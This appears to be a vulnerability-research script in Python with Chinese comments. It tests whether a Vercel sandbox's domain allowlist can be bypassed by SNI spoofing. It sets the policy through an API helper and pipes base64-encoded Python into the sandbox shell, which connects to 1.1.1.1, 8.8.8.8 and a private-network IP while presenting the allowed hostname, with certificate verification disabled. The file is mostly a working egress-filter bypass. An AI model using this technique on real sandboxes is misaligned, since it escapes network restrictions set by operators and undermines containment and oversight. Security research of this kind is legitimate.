# -*- coding: utf-8 -*-
"""SNI 欺骗验证: allowedDomains 是否只匹配 SNI 而不校验目标 IP
custom allow httpbin.org 下:
  T1 TLS(3.234.68.252, SNI=httpbin.org)  -> 基线 应 OK
  T2 TLS(1.1.1.1, SNI=httpbin.org)        -> SNI 欺骗 关键!
  T3 TLS(8.8.8.8, SNI=httpbin.org)        -> SNI 欺骗 2
  T4 TLS(1.1.1.1, SNI=example.com)        -> 对照 应 ERR
  T5 TLS(172.31.0.2, SNI=httpbin.org)     -> 私有网段+SNI
  T6 TLS(34.202.68.214, SNI=httpbin.org)  -> httpbin 其他 IP 应 OK
"""
import base64, json, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TEAM, PROJ

c, r = api('GET', '/v2/sandboxes/npol1?teamId=%s&projectId=%s' % (TEAM, PROJ))
d = json.loads(r)
sid = d['sandbox']['currentSessionId']
print('npol1 sid:', sid, 'status:', d['sandbox']['status'], flush=True)
if d['sandbox'].get('status') != 'running':
    c, r = api('GET', '/v2/sandboxes/npol1?teamId=%s&projectId=%s&resume=true' % (TEAM, PROJ))
    d = json.loads(r)
    sid = d['sandbox']['currentSessionId']
    print('resumed sid:', sid, flush=True)
    time.sleep(5)

def parse_data(r):
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try:
                out += json.loads(line).get('data', '')
            except Exception:
                pass
    return out

def run_b64(code, tag):
    b64 = base64.b64encode(code.encode()).decode()
    sc = 'echo %s | base64 -d | python3' % b64
    c, r = cmd(sid, 'sh', ['-c', sc], timeout_ms=45000)
    out = parse_data(r).strip()
    print('[%s] %s' % (tag, out[:300]), flush=True)
    return out

# 恢复 custom + allow httpbin.org
api('POST', '/v2/sandboxes/sessions/%s/network-policy?teamId=%s' % (sid, TEAM),
    {"mode": "custom", "allowedDomains": ["httpbin.org"]})
time.sleep(3)

TLS_CODE = '''import socket, ssl, sys
ip, sni = sys.argv[1], sys.argv[2]
try:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    s = ctx.wrap_socket(socket.create_connection((ip, 443), timeout=6), server_hostname=sni)
    s.sendall(b'GET /anything HTTP/1.1\\r\\nHost: ' + sni.encode() + b'\\r\\nConnection: close\\r\\n\\r\\n')
    d = s.recv(200)
    print('TLS_OK', repr(d[:100]))
except Exception as e:
    print('TLS_ERR', type(e).__name__, str(e)[:80])
'''

for ip, sni, tag in [
    ('3.234.68.252', 'httpbin.org', 'T1-baseline'),
    ('1.1.1.1',      'httpbin.org', 'T2-SNI-spoof-1111'),
    ('8.8.8.8',      'httpbin.org', 'T3-SNI-spoof-8888'),
    ('1.1.1.1',      'example.com', 'T4-ctrl-notallowed'),
    ('172.31.0.2',   'httpbin.org', 'T5-VPC+SNI'),
    ('34.202.68.214','httpbin.org', 'T6-httpbin-otherIP'),
]:
    b64 = base64.b64encode(TLS_CODE.encode()).decode()
    sc = 'echo %s | base64 -d | python3 - %s %s' % (b64, ip, sni)
    c, r = cmd(sid, 'sh', ['-c', sc], timeout_ms=45000)
    out = parse_data(r).strip()
    print('[%s] %s' % (tag, out[:250]), flush=True)

print('=== SNI-SPOOF DONE ===', flush=True)
